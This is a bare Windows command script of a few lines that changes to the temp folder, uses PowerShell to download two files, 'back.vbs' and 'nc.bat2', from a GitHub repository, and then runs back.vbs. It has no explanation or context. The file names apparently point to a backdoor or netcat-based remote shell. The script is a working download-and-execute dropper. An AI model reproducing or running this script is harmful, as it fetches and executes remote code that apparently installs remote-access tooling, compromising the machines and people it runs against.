cd %TEMP%
powershell (new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/rfaelfp/c-sharpI/main/back.vbs','back.vbs')
powershell (new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/rfaelfp/c-sharpI/main/nc.bat2','nc.bat2')
back.vbs
